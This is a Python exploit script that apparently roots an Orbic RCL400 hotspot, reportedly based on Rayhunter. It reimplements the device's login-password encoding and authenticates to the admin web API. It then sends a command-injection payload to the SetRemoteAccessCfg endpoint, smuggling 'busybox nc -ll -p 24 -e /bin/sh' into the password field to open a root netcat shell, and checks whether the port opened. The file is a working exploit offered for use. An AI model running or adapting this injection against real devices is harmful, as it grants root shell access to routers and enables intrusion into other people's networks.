#!/usr/bin/env python3
"""
DagShell Root Shell Enabler
Enables shell on Orbic RCL400 via HTTP API exploit (based on Rayhunter)
"""

import socket
import time
import sys
import json
import hashlib
import base64
import requests

TARGET_IP = "192.168.1.1"
TELNET_PORT = 24
DEFAULT_USERNAME = "admin"

def md5_hex(s):
    return hashlib.md5(s.encode()).hexdigest()

def swap_chars(s, pos1, pos2):
    """Swap characters at two positions"""
    chars = list(s)
    if pos1 < len(chars) and pos2 < len(chars):
        chars[pos1], chars[pos2] = chars[pos2], chars[pos1]
    return ''.join(chars)

def apply_secret_swapping(text, secret_num):
    """Apply character swapping based on secret"""
    for i in range(4):
        byte = (secret_num >> (i * 8)) & 0xff
        pos1 = byte % len(text)
        pos2 = i % len(text)
        text = swap_chars(text, pos1, pos2)
    return text

def encode_password(password, secret, timestamp, timestamp_start):
    """Encode password using Orbic's custom algorithm (from Rayhunter)"""
    current_time = int(time.time())
    
    # MD5 hash the password and use fixed prefix "a7"
    password_md5 = md5_hex(password)
    spliced_password = f"a7{password_md5}"
    
    # Parse secret as hex and apply swapping
    secret_num = int(secret, 16)
    spliced_password = apply_secret_swapping(spliced_password, secret_num)
    
    # Calculate time delta
    timestamp_hex = int(timestamp, 16)
    time_delta = format(timestamp_hex + (current_time - timestamp_start), 'x')
    
    # Format message with fixed "6137" prefix
    message = f"6137x{time_delta}:{spliced_password}"
    
    # Base64 encode
    result = base64.b64encode(message.encode()).decode()
    
    # Apply swapping again
    result = apply_secret_swapping(result, secret_num)
    
    return result

def enable_shell(admin_password, admin_ip=TARGET_IP):
    print("="*50)
    print("DagShell Root Shell Enabler")
    print("="*50)
    
    session = requests.Session()
    session.headers.update({"User-Agent": "DagShell/1.0"})
    
    try:
        # Step 1: Get login info
        print("\n[1/4] Getting login info...")
        timestamp_start = int(time.time())
        r = session.get(f"http://{admin_ip}/goform/GetLoginInfo", timeout=10)
        print(f"  Status: {r.status_code}")
        
        if r.status_code != 200:
            print(f"  ERROR: GetLoginInfo returned {r.status_code}")
            return False
        
        login_info = r.json()
        print(f"  Response: {login_info}")
        
        if login_info.get("retcode", -1) != 0:
            print(f"  ERROR: retcode = {login_info.get('retcode')}")
            return False
        
        pri_key = login_info.get("priKey", "")
        parts = pri_key.split("x")
        if len(parts) != 2:
            print(f"  ERROR: Invalid priKey format: {pri_key}")
            return False
        
        secret = parts[0]
        timestamp = parts[1]
        print(f"  Secret: {secret}, Timestamp: {timestamp}")
        
        # Step 2: Encode credentials
        print("\n[2/4] Encoding credentials...")
        username_md5 = md5_hex(DEFAULT_USERNAME)
        encoded_password = encode_password(admin_password, secret, timestamp, timestamp_start)
        print(f"  Username MD5: {username_md5}")
        print(f"  Encoded password: {encoded_password}")
        
        # Step 3: Login
        print("\n[3/4] Logging in...")
        login_data = {
            "username": username_md5,
            "password": encoded_password
        }
        r = session.post(
            f"http://{admin_ip}/goform/login",
            json=login_data,
            timeout=10
        )
        print(f"  Status: {r.status_code}")
        
        try:
            login_result = r.json()
            print(f"  Response: {login_result}")
            if login_result.get("retcode", -1) != 0:
                print(f"  WARNING: Login retcode = {login_result.get('retcode')}")
        except:
            print(f"  Response: {r.text[:200]}")
        
        # Step 4: Exploit - inject command to start nc shell
        print("\n[4/4] Exploiting SetRemoteAccessCfg...")
        exploit_payload = '{"password": "\\"; busybox nc -ll -p 24 -e /bin/sh & #"}'
        r = session.post(
            f"http://{admin_ip}/action/SetRemoteAccessCfg",
            data=exploit_payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        print(f"  Status: {r.status_code}")
        
        try:
            result = r.json()
            print(f"  Response: {result}")
            if result.get("retcode") == 0:
                print("  Exploit sent successfully!")
        except:
            print(f"  Response: {r.text[:200]}")
        
        # Wait and check port
        print("\n[5/5] Checking if shell is open...")
        time.sleep(3)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((admin_ip, TELNET_PORT))
        sock.close()
        
        if result == 0:
            print(f"  SUCCESS! Port {TELNET_PORT} is OPEN!")
            return True
        else:
            print(f"  Port {TELNET_PORT} still closed (error {result})")
            return False
            
    except requests.exceptions.Timeout:
        print("  ERROR: Connection timed out")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"  ERROR: Connection failed: {e}")
        return False
    except Exception as e:
        print(f"  ERROR: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python enable_shell.py <admin_password>")
        print("Example: python enable_shell.py 1d495f58")
        sys.exit(1)
    
    admin_password = sys.argv[1]
    success = enable_shell(admin_password)
    
    if success:
        print("\n" + "="*50)
        print("SHELL ENABLED! Now run: python deploy_base64.py")
        print("="*50)
    else:
        print("\n" + "="*50)
        print("Failed to enable shell.")
        print("="*50)
        sys.exit(1)
